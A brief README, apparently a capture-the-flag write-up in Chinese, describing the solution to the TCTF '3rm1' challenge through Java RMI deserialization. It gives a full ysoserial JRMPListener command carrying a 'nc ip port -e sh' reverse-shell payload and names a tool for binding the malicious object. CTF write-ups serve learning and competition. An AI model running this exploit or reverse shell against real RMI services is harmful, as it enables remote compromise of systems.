# TCTF_3rm1_solution
tctf 3rm1 solution

使用ysoserial编写exp打包，使用JRMPListener将序列化payload传过去.
java -cp  ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 4444 TCTF3rmiExp 'nc ip port -e sh'

使用 https://github.com/qtc-de/remote-method-guesser 绑定恶意对象.
访问恶意对象即可触发反序列化.
